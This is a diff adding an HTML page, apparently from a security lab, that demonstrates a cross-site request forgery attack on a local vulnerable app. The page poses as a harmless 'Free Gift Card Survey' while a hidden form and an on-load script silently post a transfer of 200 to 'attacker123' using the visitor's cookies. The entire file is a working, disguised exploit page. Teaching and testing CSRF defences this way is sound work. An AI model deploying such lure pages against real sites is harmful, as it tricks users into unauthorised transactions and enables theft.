@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Totally Harmless Site :)</title>
+</head>
+<body>
+  <h1>Free Gift Card Survey</h1>
+  <p>Thanks for visiting! Please wait while we load your survey...</p>
+
+  <!--
+    This form silently submits a POST request to the vulnerable app.
+    The victim's browser will automatically include their cookies.
+  -->
+  <form id="csrf-attack" action="http://localhost:5002/transfer" method="post">
+    <input type="hidden" name="to_account" value="attacker123" />
+    <input type="hidden" name="amount" value="200" />
+  </form>
+
+  <script>
+    // Auto-submit as soon as the page loads.
+    window.addEventListener("load", function () {
+      document.getElementById("csrf-attack").submit();
+    });
+  </script>
+</body>
+</html>
